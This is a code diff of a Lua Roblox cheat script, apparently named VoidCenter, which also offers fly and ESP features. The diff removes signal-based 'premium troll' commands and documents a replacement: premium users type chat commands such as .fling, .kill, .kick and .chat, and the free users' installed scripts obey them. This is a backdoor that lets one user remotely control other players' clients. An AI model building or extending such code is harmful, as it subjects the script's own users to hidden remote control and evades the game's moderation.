@@ -30,7 +30,6 @@ local Screen           = _VC.Screen
 local vcUsers          = _VC.vcUsers
 local IsVoidUser       = _VC.IsVoidUser
 local IsWhitelisted    = _VC.IsWhitelisted
-local SendSig          = _VC.SendSig
 
 -- FLY
 -- ═══════════════════════════════════════════════════════════
@@ -322,80 +321,30 @@ Reg("esp", {"e"}, "Toggle ESP (box - names - health - auto-updates)", false, fun
 end)
 
 -- ═══════════════════════════════════════════════════════════
--- PREMIUM TROLL COMMANDS  (typed in the script command bar)
--- All premium commands send a vcs_ signal to free users
--- who then execute the action locally on their own client.
--- This keeps everything client-sided and avoids chat tagging.
--- =========================================================
-local frozenList = {}
-local kickList   = {}
+-- PREMIUM COMMANDS  (type directly in Roblox chat)
+-- ─────────────────────────────────────────────────────────
+-- Premium users just type .fling Player1 in chat.
+-- The target's script sees it and executes locally.
+-- No signals, no encoding, no suppression needed.
+--
+-- Available commands:
+--   .fling <player>
+--   .bring <player>
+--   .bringall
+--   .freeze <player>
+--   .unfreeze <player>
+--   .kill <player>
+--   .kick <player>
+--   .unkick <player>
+--   .chat <player> <message>
+-- ═══════════════════════════════════════════════════════════
 
--- Helper: find a valid target (must be a free VC user)
-local function PremTarget(name, label)
-    local t = FindPlayer(name)
-    if not t then
-        Notify(label, "Not found: "..(name or "?"), "error") return nil end
-    if not IsVoidUser(t) then
-        Notify(label, PStr(t).." doesn't have VoidCenter", "error") return nil end
-    if IsPremium(t) then
-        Notify(label, "Cannot target Premium users", "warning") return nil end
-    return t
-end
-
-Reg("fling",    {"fl"},          "Fling a player  e.g. fling Player1",              true, function(a)
-    local t = PremTarget(a[1], "Fling") if not t then return end
-    SendSig(1, t.UserId) Notify("Fling [P]", "-> "..PStr(t), "gold")
-end)
-
-Reg("bring",    {"br"},          "Bring a player to you  e.g. bring Player1",        true, function(a)
-    local t = PremTarget(a[1], "Bring") if not t then return end
-    SendSig(2, t.UserId) Notify("Bring [P]", "-> "..PStr(t), "gold")
-end)
-
-Reg("bringall", {"ball"},        "Bring all free VC users to you",                   true, function(a)
-    local count = 0
-    for p in pairs(vcUsers) do
-        if p ~= LP and not IsPremium(p) then count = count + 1 end
-    end
-    if count == 0 then Notify("BringAll [P]", "No free VC users found", "warning") return end
-    SendSig(3, 0) Notify("BringAll [P]", "Signalled "..count.." user(s)", "gold")
-end)
-
-Reg("freeze",   {"fr"},          "Freeze/unfreeze a player  e.g. freeze Player1",    true, function(a)
-    local t = PremTarget(a[1], "Freeze") if not t then return end
-    local wasFrozen = frozenList[t]
-    frozenList[t] = not wasFrozen
-    SendSig(wasFrozen and 7 or 6, t.UserId)
-    Notify("Freeze [P]", "-> "..PStr(t)..(wasFrozen and " - unfrozen" or " - frozen"), "gold")
-end)
-
-Reg("premreset",{"pr"},          "Force-reset a player  e.g. premreset Player1",     true, function(a)
-    local t = PremTarget(a[1], "Reset [P]") if not t then return end
-    SendSig(4, t.UserId) Notify("Reset [P]", "-> "..PStr(t), "gold")
-end)
-
-Reg("kick",     {"kk"},          "Loop-kick a player  e.g. kick Player1 | kick Player1 stop", true, function(a)
-    local t = PremTarget(a[1], "Kick [P]") if not t then return end
-    if a[2] and a[2]:lower() == "stop" then
-        kickList[t] = false SendSig(9, t.UserId)
-        Notify("Kick [P]", "Stopped -> "..PStr(t), "gold") return
-    end
-    if kickList[t] then
-        kickList[t] = false SendSig(9, t.UserId)
-        Notify("Kick [P]", "Stopped -> "..PStr(t), "gold")
-    else
-        kickList[t] = true SendSig(8, t.UserId)
-        Notify("Kick [P]", "Kicking -> "..PStr(t), "gold", 6)
-    end
-end)
-
-Reg("forcechat",{"fc"},          "Make a player chat  e.g. forcechat Player1 hello", true, function(a)
-    local t = PremTarget(a[1], "ForcChat [P]") if not t then return end
-    if #a < 2 then Notify("ForceChat [P]", "Usage: forcechat <player> <message>", "warning") return end
-    local words = {} for i = 2, #a do table.insert(words, a[i]) end
-    local msg = table.concat(words, " ")
-    SendSig(13, t.UserId, msg)
-    Notify("ForceChat [P]", '-> '..PStr(t)..' : "'..msg..'"', "gold")
+-- Notify premium user that the command was typed
+-- (the actual execution happens on the target's client via detection.lua)
+Reg("prem",  {"premium","pcmds"}, "List premium dot-commands (type in Roblox chat)", true, function()
+    Notify("Premium Commands",
+        ".fling .bring .bringall .freeze .unfreeze .kill .kick .unkick .chat",
+        "gold", 8)
 end)
 
 -- ═══════════════════════════════════════════════════════════
